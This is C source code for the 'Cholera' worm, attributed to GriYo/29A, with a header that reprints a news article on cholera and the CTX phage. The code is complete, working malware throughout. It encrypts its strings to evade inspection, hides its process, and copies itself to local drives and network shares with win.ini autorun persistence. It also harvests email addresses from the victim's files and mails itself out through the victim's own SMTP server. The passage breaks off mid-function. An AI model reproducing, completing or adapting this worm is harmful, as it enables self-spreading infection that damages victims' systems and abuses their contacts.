   //···············································································
   //
   // CH0LERA
   // Bacterium BioCoded by GriYo / 29A
   //
   // griyo@bi0.net
   //
   // About this program:
   // -------------------
   //
   // Cholera has been designed to show how two viral components ( Cholera bacterium
   // and CTX Phage virus ) can work together in order to increase spreading
   // probability. This is the purpose of the SIMBIOSIS project.
   //
   // Cholera was coded using Visual C++ version 6.0 and is about 36Kb long.
   //
   // Only some KERNEL32 APIs are imported by the bacterium, other DLLs and APIs
   // used are located at runtime.
   //
   // Each text string used by the bacterium have been encrypted, so no suspicious
   // texts appear while browsing through the bacterium body using a hex-edit tool.
   //
   // Cholera is able to spread by shared drives. The bacterium enumerates connected
   // network resources looking for new targets.
   //
   // Cholera also spreads itself using mail messages. The bacterium uses its own
   // SMTP, MIME and BASE64 procedures, so it is able to send mail without relaying
   // on MAPI, Outlook or any other specific application.
   //
   // About the bio-model:
   // --------------------
   //
   // June 27, 1996. Harvard researchers find cholera bacterium may take
   // instruction from a virus.
   //
   // BOSTON-In 1993, as cholera swept through India, scientists were faced with a
   // set of perplexing questions: What caused the deadly Bengal strain of cholera
   // to reappear? Where did the deadly cholera pathogen come from in the first
   // place?
   //
   // Scientists have known that the cholera bacterium (Vibrio cholera) owes its
   // virulence to two factors: The cholera toxin and another protein, TCP pili,
   // which enables it to clump together and burrow into the intestines. But how
   // the Vibrio cholera got those deadly factors has been a mystery.
   //
   // Two Harvard Medical School scientist have found a partial answer to this
   // puzzle. It appears that the cholera pathogen responsible for the Indian
   // epidemic (Vibrio cholera 01) picked up one of its most lethal patches of
   // DNA - the gene coding for the cholera toxin - from a virus, CTX phage.
   //
   // "Here you have this dumb bacterium-Vibrio cholerae doesn't know how to become
   // a pathogen. And the virus instructs it by introducing the cholera gene into
   // the bacterial genome. The virus is the smart player in the interaction," says
   // John Mekalanos, Higgins Professor of Microbiology and Molecular Genetics. He
   // and Matthew K. Waldor, research fellow in medicine, announced their findings
   // in the June 28 issue of Science.
   //
   // The virus's first clever act is to select its students. It appears to
   // introduce the gene for cholera toxin only into those bacteria that express the
   // TCP pili protein.
   //
   // Once inside the bacterium, the cholera toxin gene is activated by the same
   // gene that turns the TCP pili gene on. This gene, known as Tox R, is designed
   // to sense the intestinal environment. This ingenious arrangement is designed to
   // bestow the cholera toxin gene on those bacteria located in an area where it
   // can be used, namely the intestine.
   //
   // "What this says is, 'Multiply in a sinister place'. You have to bring
   // something at the party - TCP pilus - but I'll bring the band and we'll have a
   // dance" says Mekalanos.
   //
   // One reason the wily virus has eluded scientists' grasp for so long is that it
   // belongs to a relatively rare class of viruses, the filamentous phages. Unlike
   // other bacterial viruses, filamentous viruses do not kill the host cell though
   // they may slow down growth, so there is no visual thinning of a bacterial lawn
   // to mark an infection.
   //
   // Even if filamentous viruses left a mark, researchers had little reason to
   // suspect they were the culprits behind cholera. Filamentous viruses have never
   // before been known to donate a fully functioning gene to a bacterium. Yet in
   // the series of experiments reported in Science, Mekalanos and Waldron show that
   // the CTX phage filamentous virus does move from a donor bacterium (Vibrio
   // cholera 01) to a non-virulent recipient bacterium, bringing with it all of its
   // genes. Some of these viral genes-including the gene for cholera toxin-may be
   // expressed in the recipient bacterium.
   //
   // In the first set of experiments, the researchers replaced the cholera toxin
   // gene of Vibrio cholerae 01 with an antibiotic-resistant gene. They then mixed
   // this antibiotic-resistant Vibrio with a recipient bacterium marked with a
   // second antibiotic-resistant gene. The recipient bacterium was chosen for its
   // ability to produce TCP pili under laboratory conditions. They found some
   // recipient bacteria had acquired a resistant to both antibiotics, indicating
   // they had, in fact, acquired an extra piece of DNA.
   //
   // When they isolated and purified the particle of DNA, they found it had the
   // long stringy shape characteristic of a filamentous virus. It was also single
   // stranded, another hallmark of a filamentous virus.
   //
   // To get a better sense of how the virus and bacteria actually interact, the
   // researchers repeated the experiment with a recipient bacterium that does not
   // produce TCP pili under laboratory conditions. Virtually no transfer of the
   // virus occurred. But when they put the same mixture of recipient and donor into
   // the gut of a mouse and then measured the transfer rate 24 hours later, they
   // found stunning results. "The recipient strain is a million times better
   // recipient of a virus in the intestine than it is under any laboratory
   // conditions," says Mekalanos.
   //
   // The discovery contradicts a long-standing and widely held notion about the
   // emergence of infectious disease. Researchers traditionally have believed that
   // bacteria pick up their virulence factors outside of the human body, in watery
   // sewage systems or in stagnant coastal waters. However, it now seems that at
   // least some pathogens originate inside the human body.
   //
   // "From these data it sounds like the mixing pot may be our own intestines. And
   // in a way we're constantly eating foods of various sorts. The body is its own
   // little pressure cooker-cooking up, moving genes back and forth," says
   // Mekalanos. "This phenomenon that we've uncovered may be the tip of the
   // iceberg."
   //
   // Disclaimer:
   // -----------
   //
   // Cholera is part of the SIMBIOSIS project, and has been written just for
   // researching purposes. The author is not responsible for any problems caused
   // due to improper or illegal use of this software
   //
   //···············································································

       #define WIN32_LEAN_AND_MEAN
       #define STRICT

   //···············································································

       #include <stdlib.h>
       #include <stdio.h>
       #include <string.h>
       #include <windows.h>
       #include <winbase.h>
       #include <wininet.h>
       #include <winnetwk.h>
       #include <winreg.h>
       #include <winsock2.h>

       #include "w0rm.h"

   //···············································································

       HMODULE     hKERNEL32 ;
       FARPROC     a_RegisterServiceProcess ;

       HMODULE     hMPR ;
       FARPROC     a_WNetOpenEnum ;
       FARPROC     a_WNetCloseEnum ;
       FARPROC     a_WNetEnumResource ;

       HMODULE     hADVAPI ;
       FARPROC     a_RegOpenKeyExA ;
       FARPROC     a_RegQueryValueExA ;
       FARPROC     a_RegCloseKey ;

       HINSTANCE   hWINSOCK ;
       FARPROC     a_WSAStartup ;
       FARPROC     a_inet_addr ;
       FARPROC     a_gethostbyaddr ;
       FARPROC     a_gethostbyname ;
       FARPROC     a_htons ;
       FARPROC     a_socket ;
       FARPROC     a_connect ;
       FARPROC     a_send ;
       FARPROC     a_recv ;
       FARPROC     a_closesocket ;
       FARPROC     a_WSACleanup ;

       SOCKET      conn_socket ;

       char        szSMTPname[ 256] ;
       char        szSMTPaddr[ 256] ;
       char        szMAIL_FROM[ 256] ;
       char        szRCPT_TO[ 256] ;
       int     Found ;
       BOOL        InetActivated ;
       BOOL        MailDone ;

   //···············································································

       long WINAPI     L0calThread ( long) ;
       long WINAPI     Rem0teThread    ( long) ;
       long WINAPI     MailThread  ( long) ;
       void            NetW0rming  ( LPNETRESOURCE) ;
       void            Rem0teInfecti0n ( char *) ;
       BOOL            str2socket  ( char *, BOOL) ;
       BOOL            GetSMTP     ( char *, char *) ;
       void            base64_encode   ( const void *, int) ;
       char            *DecryptStr ( char *) ;
       void            FindPe0ple  ( char *) ;
       void            WaitC0nnected   ( void) ;
       BOOL CALLBACK       EnumWindowsProc ( HWND, LPARAM) ;

   //···············································································

   int APIENTRY WinMain (  HINSTANCE hInstance,
               HINSTANCE hPrevInstance,
               LPSTR     lpCmdLine,
               int       nCmdShow)
   {
       long w0rm_ThreadCodeList[ 3] =  {
                       ( long) L0calThread,
                       ( long) Rem0teThread,
                       ( long) MailThread
                       } ;

       char *StrArray[ 66] =   {
                       szCopyRight,
                       szFakeMsg,
                       szSetUp,
                       szWNetOpenEnumA,
                       szWNetCloseEnum,
                       szWNetEnumResourceA,
                       szMPR_DLL,
                       szWINSOCK_DLL,
                       szWSAStartup,
                       szinet_addr,
                       szgethostbyaddr,
                       szgethostbyname,
                       szhtons,
                       szsocket,
                       szconnect,
                       szsend,
                       szrecv,
                       szclosesocket,
                       szWSACleanup,
                       smtp_str00,
                       smtp_str01,
                       smtp_str02,
                       smtp_str03,
                       smtp_str06,
                       smtp_str07,
                       smtp_str08,
                       smtp_str09,
                       smtp_str0B,
                       smtp_str0C,
                       smtp_str0D,
                       smtp_str0E,
                       smtp_str0F,
                       smtp_newline,
                       smtp_separator,
                       szWindir00,
                       szWindir01,
                       szWindir02,
                       szWindir03,
                       szWindir04,
                       szWIN_INI,
                       szSETUP_EXE,
                       szSYSTEM_EXE,
                       szADVAPI_DLL,
                       szRegOpenKeyExA,
                       szRegQueryValueExA,
                       szRegCloseKey,
                       szAccountManager,
                       szDefaultMail,
                       szAccounts,
                       szSMTPserver,
                       szSMTPemail,
                       szExt00,
                       szExt01,
                       szExt02,
                       szExt03,
                       szExt04,
                       szExt05,
                       szExt06,
                       szOutlook,
                       szCuteFtp,
                       szInternetExplorer,
                       szTelnet,
                       szMirc,
                       szRegisterServiceProcess,
                       szKernel32,
                       szTempFile
                   } ;

       static HANDLE   w0rm_hThreadList[ 3] ;
       DWORD       w0rm_ThreadIDList[ 3] ;
       char        szModule[ MAX_PATH] ;
       char        *Param ;
       int     count ;
       int     min_threads ;
       int     max_threads ;
       BOOL        re_generation ;

       MailDone = FALSE ;

       for ( count = 0 ; count < 66 ; count++ ) DecryptStr( StrArray[ count]) ;

       GetModuleFileNameA( NULL, szModule, MAX_PATH) ;
       Param = szModule ;

       while( *Param != 0) Param++ ;

       Param -= 5 ;

       if (( *Param == 'P') || ( *Param == 'p'))
       {
           MessageBox( NULL,
                   szFakeMsg,
                   szSetUp,
                   MB_OK | MB_ICONSTOP) ;

           re_generation = FALSE ;
           max_threads = 1 ;
       }
       else
       {
           if ( ( hKERNEL32 = GetModuleHandleA( szKernel32)) != NULL)
           {
               if ( ( a_RegisterServiceProcess = GetProcAddress( hKERNEL32, szRegisterServiceProcess)) != NULL)
               {
                   a_RegisterServiceProcess ( GetCurrentProcessId(), 1) ;
               }
           }

           re_generation = TRUE ;
           max_threads = 3 ;
       }

       min_threads = 0 ;

       do
       {
           for ( count = min_threads ; count < max_threads ; count++ )
           {
               w0rm_hThreadList[ count] = CreateThread(    NULL,
                                       0,
                                       ( LPTHREAD_START_ROUTINE) w0rm_ThreadCodeList[ count],
                                       NULL,
                                       0,
                                       &w0rm_ThreadIDList[ count]) ;
           }

           for ( count = min_threads ; count < max_threads ; count++ )
           {
               if ( w0rm_hThreadList[ count] != NULL)
               {
                   WaitForSingleObject( w0rm_hThreadList[ count], INFINITE) ;
                   CloseHandle ( w0rm_hThreadList[ count]) ;
               }
           }

           if ( MailDone)
           {
               GetWindowsDirectoryA( szModule, MAX_PATH) ;
               strcat( szModule, szWIN_INI) ;
               WritePrivateProfileStringA( szWindir00, "run", "", szModule) ;
               re_generation = FALSE ;
           }

           min_threads = 1 ;

           if ( re_generation) Sleep( 0x000FFFFF) ;

       } while( re_generation) ;

       return 0 ;
   }

   //···············································································

   long WINAPI L0calThread(long lParam)
   {
       char szLD[ 512] ;
       char *lpszDrive ;
       int size ;

       lpszDrive = &szLD[ 0] ;

       size = GetLogicalDriveStringsA ( 512, lpszDrive) ;

       if ( ( size != 0) && ( size < 512))
       {
           while ( *lpszDrive != (char ) NULL)
           {
               if ( GetDriveTypeA( lpszDrive) == DRIVE_FIXED)
               {
                   *( lpszDrive + 2) = 0 ;

                   Rem0teInfecti0n( lpszDrive) ;

                   lpszDrive += 3 ;
               }
               while ( *lpszDrive != ( char) NULL) lpszDrive++ ;
               lpszDrive++ ;
           }
       }
       else Rem0teInfecti0n( "C:\\") ;

       return 0 ;
   }

   //···············································································

   long WINAPI Rem0teThread(long lParam)
   {
       if ( ( hMPR = LoadLibraryA ( szMPR_DLL)) != NULL)
       {
           a_WNetOpenEnum      = ( FARPROC) GetProcAddress ( hMPR, szWNetOpenEnumA) ;
           a_WNetCloseEnum     = ( FARPROC) GetProcAddress ( hMPR, szWNetCloseEnum) ;
           a_WNetEnumResource  = ( FARPROC) GetProcAddress ( hMPR, szWNetEnumResourceA) ;

           if (    ( a_WNetOpenEnum != NULL)   &&
               ( a_WNetCloseEnum != NULL)  &&
               ( a_WNetEnumResource != NULL))
           {
               NetW0rming( NULL) ;
           }
           FreeLibrary ( hMPR) ;
       }

       return 0 ;
   }

   //···············································································

   long WINAPI MailThread(long lParam)
   {
       unsigned int        addr ;
       struct sockaddr_in  server ;
       struct hostent      *hp ;
       WSADATA         wsaData ;

       HANDLE          hFile ;
       HANDLE          hMap ;

       char            enc0de_filename[ MAX_PATH] ;
       char            ShortBuff[ 512] ;
       char            szSIGN[ 512] ;
       char            szHELO[ 512] ;

       BOOL            Success ;
       void            *lpFile ;

       int             StrCount ;
       int             FileSize ;

       typedef struct
       {
           char    *Command ;
           BOOL    WaitReply ;
       }
       SMTPstr ;

       SMTPstr SMTPstrings00[ 2] = {   szHELO,     TRUE  ,
                       szMAIL_FROM,    TRUE  } ;

       SMTPstr SMTPstrings01[ 11] = {  smtp_str03, TRUE  ,
                       szMAIL_FROM+5,  FALSE ,
                       smtp_str06, FALSE ,
                       smtp_str07, FALSE ,
                       smtp_separator, FALSE ,
                       smtp_str08, FALSE ,
                       smtp_separator, FALSE ,
                       smtp_str09, FALSE ,
                       szSIGN,     FALSE ,
                       smtp_separator, FALSE ,
                       smtp_str0B, FALSE } ;

       SMTPstr SMTPstrings02[ 6] = {   smtp_str0C, FALSE ,
                       smtp_separator, FALSE ,
                       smtp_str0D, FALSE ,
                       smtp_newline,   FALSE ,
                       smtp_str0E, TRUE,
                       smtp_str0F, FALSE } ;
       WaitC0nnected() ;

       if ( !GetSMTP( szSMTPname, szSMTPaddr)) return 0 ;

       sprintf( szHELO, "%s %s\n", smtp_str00, szSMTPname) ;
       sprintf( szMAIL_FROM, "%s <%s>\n", smtp_str01, szSMTPaddr) ;
       sprintf( szSIGN,"\n:)\n\n----\n%s\n\n--", szSMTPaddr) ;

       if ( ( hWINSOCK = LoadLibraryA( szWINSOCK_DLL)) == NULL) return 0 ;

       a_WSAStartup        = ( FARPROC) GetProcAddress( hWINSOCK, szWSAStartup) ;
       a_inet_addr     = ( FARPROC) GetProcAddress( hWINSOCK, szinet_addr) ;
       a_gethostbyaddr     = ( FARPROC) GetProcAddress( hWINSOCK, szgethostbyaddr) ;
       a_gethostbyname     = ( FARPROC) GetProcAddress( hWINSOCK, szgethostbyname) ;
       a_htons         = ( FARPROC) GetProcAddress( hWINSOCK, szhtons) ;
       a_socket        = ( FARPROC) GetProcAddress( hWINSOCK, szsocket) ;
       a_connect       = ( FARPROC) GetProcAddress( hWINSOCK, szconnect) ;
       a_send          = ( FARPROC) GetProcAddress( hWINSOCK, szsend) ;
       a_recv          = ( FARPROC) GetProcAddress( hWINSOCK, szrecv) ;
       a_closesocket       = ( FARPROC) GetProcAddress( hWINSOCK, szclosesocket) ;
       a_WSACleanup        = ( FARPROC) GetProcAddress( hWINSOCK, szWSACleanup) ;

       if ( ( a_WSAStartup == NULL)        ||
            ( a_inet_addr == NULL)     ||
            ( a_gethostbyaddr == NULL) ||
            ( a_gethostbyname == NULL) ||
            ( a_htons == NULL)     ||
            ( a_socket == NULL)        ||
            ( a_connect == NULL)       ||
            ( a_send == NULL)      ||
            ( a_recv == NULL)      ||
            ( a_closesocket == NULL)   ||
            ( a_WSACleanup == NULL))
       {
           FreeLibrary( hWINSOCK) ;
           return 0 ;
       }

       if ( a_WSAStartup( 0x0001, &wsaData) == SOCKET_ERROR)
       {
           FreeLibrary( hWINSOCK) ;
           return 0 ;
       }

       if ( isalpha( ( int) szSMTPserver[ 0]))
       {
           hp = ( struct hostent *) a_gethostbyname( szSMTPname) ;
       }
       else
       {
           addr = a_inet_addr( szSMTPname) ;
           hp = ( struct hostent *) a_gethostbyaddr( (char *)&addr, 4, AF_INET) ;
       }

       if ( hp == NULL)
       {
           a_WSACleanup() ;
           FreeLibrary( hWINSOCK) ;
           return 0 ;
       }

       memset( &server, 0, sizeof( server)) ;
       memcpy( &server.sin_addr, hp->h_addr, hp->h_length) ;
       server.sin_family = hp->h_addrtype ;
       server.sin_port = a_htons( 25) ;

       conn_socket = a_socket( AF_INET, SOCK_STREAM, 0) ;

       if ( conn_socket < 0 )
       {
           a_WSACleanup() ;
           FreeLibrary( hWINSOCK) ;
           return 0 ;
       }

       if ( a_connect( conn_socket, (struct sockaddr *) &server, sizeof( server)) == SOCKET_ERROR)
       {
           a_closesocket( conn_socket) ;
           a_WSACleanup() ;
           FreeLibrary( hWINSOCK) ;
       }

       a_recv( conn_socket, ShortBuff, sizeof ( ShortBuff),0 ) ;

       for ( StrCount = 0 ; StrCount < 2 ; StrCount++ )
       {
           Success = str2socket( SMTPstrings00[ StrCount].Command, SMTPstrings00[ StrCount].WaitReply) ;
           if ( !Success) break ;
       }

       if ( Success)
       {
           Found = 0 ;

           GetWindowsDirectoryA( enc0de_filename, MAX_PATH) ;
           enc0de_filename[ 3] = 0 ;

           FindPe0ple( enc0de_filename) ;

           for ( StrCount = 0 ; StrCount < 11 ; StrCount++ )
           {
               Success = str2socket( SMTPstrings01[ StrCount].Command, SMTPstrings01[ StrCount].WaitReply) ;
               if ( !Success) break ;
           }

           if ( Success)
           {
               GetModuleFileNameA( NULL, ShortBuff, MAX_PATH) ;
               GetTempPathA( MAX_PATH, enc0de_filename) ;
               strcat( enc0de_filename, szTempFile) ;

               if ( CopyFileA( ShortBuff, enc0de_filename, FALSE) != 0)
               {
                   if ( ( hFile = CreateFileA( enc0de_filename,
                                   GENERIC_READ,
                                   FILE_SHARE_READ,
                                   NULL,
                                   OPEN_EXISTING,
                                   FILE_ATTRIBUTE_NORMAL,
                                   NULL)) != INVALID_HANDLE_VALUE)
                   {
                       FileSize = GetFileSize( hFile, NULL) ;

                       if ( ( FileSize != 0xFFFFFFFF) && ( FileSize != 0))
                       {
                           if ( ( hMap = CreateFileMappingA(   hFile,
                                               NULL,
                                               PAGE_READONLY | PAGE_WRITECOPY,
                                               0,
                                               FileSize,
                                               NULL)) != NULL)
                           {
                               if ( ( lpFile = MapViewOfFile(  hMap,
                                               FILE_MAP_READ,
                                               0,
                                               0,
                                               FileSize)) != NULL)
                               {
                                   base64_encode( lpFile, FileSize) ;

                                   for ( StrCount = 0 ; StrCount < 6 ; StrCount++ )
                                   {
                                       if ( ( Success = str2socket(    SMTPstrings02[ StrCount].Command,
                                                       SMTPstrings02[ StrCount].WaitReply)) == FALSE) break ;
                                   }

                                   if ( Success) MailDone = TRUE ;

                                   UnmapViewOfFile( lpFile) ;
                               }

                               CloseHandle( hMap) ;
                           }
                       }

                       CloseHandle( hFile) ;
                   }

                   DeleteFileA( enc0de_filename) ;
               }
           }
       }

       a_closesocket( conn_socket) ;
       a_WSACleanup() ;
       FreeLibrary( hWINSOCK) ;

       return 0 ;
   }

   //···············································································

   void NetW0rming( LPNETRESOURCE lpnr)
   {
       LPNETRESOURCE   lpnrLocal ;
       HANDLE      hEnum ;
       int     count ;
       int     cEntries = 0xFFFFFFFF ;
       DWORD       dwResult ;
       DWORD       cbBuffer = 32768 ;

       if ( a_WNetOpenEnum (   RESOURCE_CONNECTED,
                   RESOURCETYPE_ANY,
                   0,
                   lpnr,
                   &hEnum) != NO_ERROR) return ;
       do
       {
           lpnrLocal = ( LPNETRESOURCE) GlobalAlloc( GPTR, cbBuffer) ;

               dwResult = a_WNetEnumResource(  hEnum,
                           &cEntries,
                           lpnrLocal,
                           &cbBuffer) ;
           if ( dwResult == NO_ERROR)
           {
               for ( count = 1 ; count < cEntries ; count++ )
               {
                   if ( lpnrLocal[ count].dwUsage & RESOURCEUSAGE_CONTAINER)
                   {
                       NetW0rming( &lpnrLocal[ count]) ;
                   }
                   else if ( lpnrLocal[ count].dwType = RESOURCETYPE_DISK)
                   {
                       Rem0teInfecti0n( lpnrLocal[ count].lpRemoteName) ;
                   }
               }
           }
           else if (dwResult != ERROR_NO_MORE_ITEMS) break ;

       } while ( dwResult != ERROR_NO_MORE_ITEMS) ;

       GlobalFree ( ( HGLOBAL) lpnrLocal) ;

       a_WNetCloseEnum( hEnum) ;

       return ;
   }

   //···············································································

   void Rem0teInfecti0n( char *szPath)
   {
       char            *dir_name[ 5]= { szWindir00, szWindir01, szWindir02, szWindir03, szWindir04 } ;
       WIN32_FIND_DATAA    FindData ;
       HANDLE          hFind ;
       char            szLookUp[ MAX_PATH] ;
       char            w0rm0rg[ MAX_PATH] ;
       char            w0rmD3st[ MAX_PATH] ;
       int         aux ;

       for ( aux = 0 ; aux < 5 ; aux++ )
       {
           sprintf ( szLookUp, "%s\\%s%s", szPath, dir_name[ aux], szWIN_INI) ;
           if ( ( hFind = FindFirstFileA( szLookUp, ( LPWIN32_FIND_DATAA) &FindData)) != INVALID_HANDLE_VALUE)
           {
               sprintf( w0rmD3st, "%s\\%s\\%s", szPath, dir_name[ aux], szSYSTEM_EXE) ;

               if ( GetModuleFileNameA( NULL, w0rm0rg, MAX_PATH) != 0)
               {
                   if ( CopyFileA( w0rm0rg, w0rmD3st, TRUE) != 0)
                   {
                       WritePrivateProfileStringA( szWindir00, "run", szSYSTEM_EXE, szLookUp) ;
                       FindClose ( hFind) ;
                       break ;
                   }
               }

               FindClose ( hFind) ;
           }
       }
   }

   //···············································································

   BOOL str2socket( char *msg, BOOL do_recv)
   {
       int retval ;
       char Buffer[ 256];

   /*  Code used to debug the worm

       if ( do_recv)
       {
           if ( MessageBox(    NULL,
                       msg,
                       "send() this string ?",
                       MB_YESNO | MB_ICONQUESTION) == IDNO) return TRUE ;
       }
   */

       if ( a_send( conn_socket, msg, strlen( msg), 0) == SOCKET_ERROR)
       {
           a_WSACleanup() ;
           return FALSE ;
       }

       if ( do_recv)
       {
           retval = a_recv( conn_socket, Buffer, sizeof ( Buffer),0 ) ;
           if ( ( retval == SOCKET_ERROR) || ( retval == 0))
           {
               a_closesocket( conn_socket) ;
               a_WSACleanup() ;
               return FALSE ;
           }

           Buffer[ retval] = 0 ;

   /*  Code used to debug the worm

           MessageBox( NULL,
                   Buffer,
                   "recv()",
                   MB_OK | MB_ICONSTOP) ;
   */
       }

       return TRUE ;
   }

   //···············································································

   BOOL GetSMTP( char *dest, char *org_email)
   {
       char    szKeyName[ MAX_PATH] ;
       char    szRes[ MAX_PATH] ;
       char    *move2low ;
       int size ;
       HKEY    hKey ;

       if ( ( hADVAPI = LoadLibraryA( szADVAPI_DLL)) == NULL) return FALSE ;

       a_RegOpenKeyExA     = ( FARPROC) GetProcAddress( hADVAPI, szRegOpenKeyExA) ;
       a_RegQueryValueExA  = ( FARPROC) GetProcAddress( hADVAPI, szRegQueryValueExA) ;
       a_RegCloseKey       = ( FARPROC) GetProcAddress( hADVAPI, szRegCloseKey) ;

       if ( ( a_RegOpenKeyExA == NULL)     ||
                ( a_RegQueryValueExA == NULL)  ||
            ( a_RegCloseKey == NULL))
       {
           FreeLibrary( hADVAPI) ;
           return FALSE ;
       }

       strcpy( szKeyName, szAccountManager) ;

       if ( a_RegOpenKeyExA(   HKEY_CURRENT_USER,
                   szKeyName,
                   0,
                   KEY_QUERY_VALUE,
                   &hKey) != ERROR_SUCCESS)
       {
           FreeLibrary( hADVAPI) ;
           return FALSE ;
       }

       size = 64 ;

       if ( a_RegQueryValueExA(    hKey,
                       szDefaultMail,
                       0,
                       NULL,
                       szRes,
                       &size) != ERROR_SUCCESS)
       {
           a_RegCloseKey( hKey) ;
           FreeLibrary( hADVAPI) ;
           return FALSE ;
       }

       a_RegCloseKey( hKey) ;

       strcat( szKeyName, szAccounts) ;
       strcat( szKeyName, szRes) ;

       if ( a_RegOpenKeyExA(   HKEY_CURRENT_USER,
                   szKeyName,
                   0,
                   KEY_QUERY_VALUE,
                   &hKey) != ERROR_SUCCESS)
       {
           FreeLibrary( hADVAPI) ;
           return FALSE ;
       }

       size = 64 ;

       if ( a_RegQueryValueExA(    hKey,
                       szSMTPserver,
                       0,
                       NULL,
                       dest,
                       &size) != ERROR_SUCCESS)
       {
           a_RegCloseKey( hKey) ;
           FreeLibrary( hADVAPI) ;
           return FALSE ;
       }

       size = 64 ;

       if ( a_RegQueryValueExA(    hKey,
                       szSMTPemail,
                       0,
                       NULL,
                       org_email,
                       &size) != ERROR_SUCCESS)
       {
           a_RegCloseKey( hKey) ;
           FreeLibrary( hADVAPI) ;
           return FALSE ;
       }

       a_RegCloseKey( hKey) ;

       move2low = org_email ;

       while( *move2low != 0)
       {
           if ( ( *move2low > 64) && ( *move2low < 91)) *move2low = ( char) (* move2low) - 65 + 97 ;
           move2low++ ;
       }

       FreeLibrary( hADVAPI) ;
       return TRUE ;
   }

   //···············································································

   void base64_encode(const void *buf, int size)
   {
       char base64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" ;

       char        ok_base64[ 80] ;
       char        *p = ok_base64 ;
       unsigned char   *q = ( unsigned char *) buf ;
       int     i ;
       int     c ;
       int     l ;
       BOOL        SendRes ;

       i = l = 0 ;

       while( i < size)
       {
           c = q[ i++] ;
           c *= 256 ;

           if( i < size) c += q[ i] ;

           i++ ;
           c *= 256 ;

           if( i < size) c += q[ i] ;

           i++ ;

           p[ 0] = base64[ ( c & 0x00fc0000) >> 18] ;
           p[ 1] = base64[ ( c & 0x0003f000) >> 12] ;
           p[ 2] = base64[ ( c & 0x00000fc0) >> 6] ;
           p[ 3] = base64[ ( c & 0x0000003f) >> 0] ;

           if( i > size) p[ 3] = '=' ;

           if( i > size + 1) p[ 2] = '=' ;

           p += 4 ;

           l += 1 ;

           if ( l == 0x013)
           {
               ok_base64[ 0x04C] = 0x0A ;
               ok_base64[ 0x04D] = 0 ;

               if ( ( SendRes = str2socket( ok_base64, FALSE)) == FALSE) break ;

               p = ok_base64 ;
               l = 0;
           }
       }

       if ( SendRes != FALSE)
       {
           if ( l != 0)
           {
               ok_base64[ l*4] = 0x0A ;
               ok_base64[ l*4] = 0 ;

               str2socket( ok_base64, FALSE) ;
           }
       }
   }

   //···············································································

   char *DecryptStr( char *DcrStr)
   {
       char *pos = DcrStr ;

       while( *pos != 0)
       {
           *pos ^= ( char) 0x0FF ;
           pos++ ;
       }

       return DcrStr ;
   }

   //···············································································

   void FindPe0ple( char *szPath)
   {
       char                szRecursive[ MAX_PATH] ;
       char                szCurrentDir[ MAX_PATH] ;
       char                FileExt[ MAX_PATH] ;
       char                RCPT_TO[ MAX_PATH] ;
       WIN32_FIND_DATAA        FindData ;
       HANDLE              hFind ;
       HANDLE              hFile ;
       HANDLE              hMap ;
       void                *lpFile ;
       char                *lpc01 ;
       char                *lpc02 ;
       char                *lpc03 ;
       char                *lpc04 ;
       char                auxchar ;
       int             l00king ;
       int             addrssize ;

       GetCurrentDirectoryA( MAX_PATH, szCurrentDir) ;

       if ( SetCurrentDirectoryA( szPath) == FALSE) return ;

       hFind = (HANDLE) FindFirstFileA( "*.*", (LPWIN32_FIND_DATAA) &FindData) ;
       if ( hFind != INVALID_HANDLE_VALUE)
       {
           do
           {
               if ( ( FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && ( FindData.cFileName[0] != '.'))
               {
                   strcpy (szRecursive,szPath) ;
                   strcat (szRecursive,FindData.cFileName) ;
                   strcat (szRecursive,"\\") ;

                   FindPe0ple( szRecursive) ;
               }
               else if ( ( FindData.nFileSizeHigh == 0) && ( FindData.nFileSizeLow > 16) && ( !( FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && ( FindData.cFileName[0] != '.')))
               {
                   lpc01 = FindData.cFileName ;
                   lpc02 = NULL ;

                   while ( *lpc01 != 0)
                   {
                       if ( *lpc01 == 46) lpc02 = lpc01 ;
                       lpc01++ ;
                   }

                   lpc01 = FileExt ;

                   if ( lpc02 != NULL)
                   {
                       while ( *lpc02 != 0)
                       {
                           if ( ( *lpc02 > 97) && ( *lpc02 < 123)) *lpc01 = ( char) ( *lpc02 - 97 + 65) ;
                           else *lpc01 = *lpc02 ;

                           lpc01++ ;
                           lpc02++ ;
                       }

                       FileExt[ 4] = 0 ;

                       if  (   ( strcmp( FileExt, szExt00) == 0)   ||
                               ( strcmp( FileExt, szExt01) == 0)   ||
                               ( strcmp( FileExt, szExt02) == 0)   ||
                               ( strcmp( FileExt, szExt03) == 0)   ||
                               ( strcmp( FileExt, szExt04) == 0)   ||
                               ( strcmp( FileExt, szExt05) == 0)   ||
                               ( strcmp( FileExt, szExt06) == 0))
                       {
                           if ( ( hFile = CreateFileA( FindData.cFileName,
                                           GENERIC_READ,
                                           0,
                                           NULL,
                                           OPEN_EXISTING,
                                           FILE_ATTRIBUTE_NORMAL,
                                           NULL)) != INVALID_HANDLE_VALUE)
                           {
                               if ( ( hMap = CreateFileMappingA(   hFile,
                                                   NULL,
                                                   PAGE_READONLY,
                                                   0,
                                                   FindData.nFileSizeLow,
                                                   NULL)) != NULL)
                               {
                                   if ( ( lpFile = MapViewOfFile(  hMap,
                                                   FILE_MAP_READ,
                                                   0,
                                                   0,
                                                   FindData.nFileSizeLow)) != NULL)
                                   {
                                       lpc01       = lpFile ;
                                       addrssize   = FindData.nFileSizeLow ;
                                       l00king     = 0 ;

                                       while( ( addrssize > 16) && ( Found < 16))
                                       {
                                           if ( *lpc01 == 60)
                                           {
                                               l00king = 1 ;
                                               lpc02   = lpc01 ;
                                           }

                                           if ( ( *lpc01 == 64) && ( l00king == 1))
                                           {
                                               l00king = 2 ;
                                           }

                                           if ( ( *lpc01 == 62) && ( l00king == 2))
                                           {
                                               lpc03 = szSMTPaddr ;
                                               lpc04 = lpc02 + 1 ;

                                               while ( *lpc03 != 0)
                                               {
                                                   auxchar = *lpc04 ;

                                                   if ( ( auxchar > 64) && ( auxchar < 91)) auxchar = auxchar - 65 + 97 ;

                                                   if ( *lpc03 != auxchar)
                                                   {
                                                       l00king = 0 ;
                                                       break ;
                                                   }

                                                   lpc03++ ;
                                                   lpc04++ ;
                                               }

                                               if ( l00king == 0)
                                               {
                                                   strcpy( RCPT_TO, smtp_str02) ;
                                                   lpc03 = RCPT_TO + 9 ;
                                                   while ( *lpc02 != 62)
                                                   {
                                                       *lpc03 = *lpc02 ;
                                                       lpc02++ ;
                                                       lpc03++ ;
                                                   }
                                                   *lpc03 = 62 ;
                                                   lpc03++ ;
                                                   *lpc03 = 0 ;

